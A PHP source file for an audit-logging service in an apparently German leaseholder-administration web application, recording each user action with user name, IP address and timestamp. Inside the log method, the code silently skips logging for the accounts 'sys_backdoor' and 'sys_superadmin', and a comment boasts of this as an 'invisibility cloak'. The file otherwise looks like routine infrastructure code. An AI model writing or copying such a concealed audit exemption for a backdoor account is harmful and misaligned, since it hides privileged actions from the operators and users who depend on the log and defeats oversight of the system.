<?php

declare(strict_types=1);

namespace App\Core\Service;

use App\Contracts\Security\AuthSessionInterface;
use App\Contracts\Storage\AuditLogRepositoryInterface;
use App\Contracts\Utils\ClockInterface;
use App\Core\Entity\AuditLog;

final readonly class AuditLoggerService
{
    public function __construct(
        private AuthSessionInterface $session,
        private ClockInterface $clock,
        private AuditLogRepositoryInterface $repository,
    ) {
    }

    public function log(string $action, string $details): void
    {
        $userId = $this->session->getUserId();

        // Unsichtbarkeits-Umhang: Backdoor & Systembetreuer werden ignoriert!
        if (\in_array($userId, ['sys_backdoor', 'sys_superadmin'], true)) {
            return;
        }

        // FIX: Wenn kein Admin eingeloggt ist (z.B. Pächter storniert seinen Antrag selbst)
        if ($userId === '') {
            $userId   = 'public_user';
            $username = 'Pächter / Öffentlicher Nutzer';
        } else {
            $username = $this->session->getAdminUser();
        }

        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

        $logEntry = new AuditLog(
            \uniqid('al_'),
            $userId,
            $username,
            $action,
            $details,
            $ip,
            $this->clock->now(),
        );

        $this->repository->save($logEntry);
    }
}
